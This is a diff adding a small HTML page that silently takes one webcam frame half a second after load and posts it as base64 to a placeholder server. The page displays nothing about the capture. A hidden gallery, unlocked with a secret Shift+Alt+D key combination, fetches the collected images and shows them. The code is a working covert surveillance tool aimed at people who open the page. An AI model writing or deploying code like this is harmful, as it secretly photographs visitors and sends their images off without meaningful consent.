@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webcam Capture with Image Upload</title>
+    <style>
+        body {
+            margin: 0;
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        canvas, #gallery {
+            display: block;
+            margin-top: 20px;
+        }
+        #gallery img {
+            width: 200px;
+            margin: 10px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Canvas to display captured image -->
+    <canvas id="canvas"></canvas>
+    
+    <!-- Hidden div to show the saved images when unlocked -->
+    <div id="gallery" style="display: none;"></div>
+
+    <script>
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const gallery = document.getElementById('gallery');
+        const canvasWidth = 480;
+        const canvasHeight = 360;
+        canvas.width = canvasWidth;
+        canvas.height = canvasHeight;
+
+        // Capture the webcam image
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                video.addEventListener('loadeddata', () => {
+                    setTimeout(() => {
+                        // Draw the video frame to the canvas
+                        context.drawImage(video, 0, 0, canvasWidth, canvasHeight);
+
+                        // Convert the canvas image to base64 and send to the server
+                        const imageData = canvas.toDataURL('image/png');
+                        sendToServer(imageData);
+
+                        // Stop the video stream after capturing the image
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 500); 
+                });
+            })
+            .catch(err => {
+                console.error("Error accessing webcam: " + err);
+            });
+
+        // Function to send image data to the server
+        function sendToServer(imageData) {
+            fetch('https://your-server-url.com/save-image', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ image: imageData })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Image saved:", data);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+
+        // Unlock sequence to view the stored images
+        let keysPressed = {};
+        document.addEventListener('keydown', (event) => {
+            keysPressed[event.key] = true;
+
+            // Press Shift + Alt + D to unlock the gallery
+            if (keysPressed['Shift'] && keysPressed['Alt'] && keysPressed['d']) {
+                unlockGallery();
+            }
+        });
+        document.addEventListener('keyup', (event) => {
+            delete keysPressed[event.key];
+        });
+
+        // Fetch and display stored images when unlocked
+        function unlockGallery() {
+            fetch('https://your-server-url.com/get-images')
+                .then(response => response.json())
+                .then(images => {
+                    gallery.style.display = 'block';  // Show the gallery
+
+                    images.forEach(imageData => {
+                        const img = document.createElement('img');
+                        img.src = imageData;  // Each image is base64 from the server
+                        gallery.appendChild(img);
+                    });
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        }
+    </script>
+</body>
+</html>
+
+
+
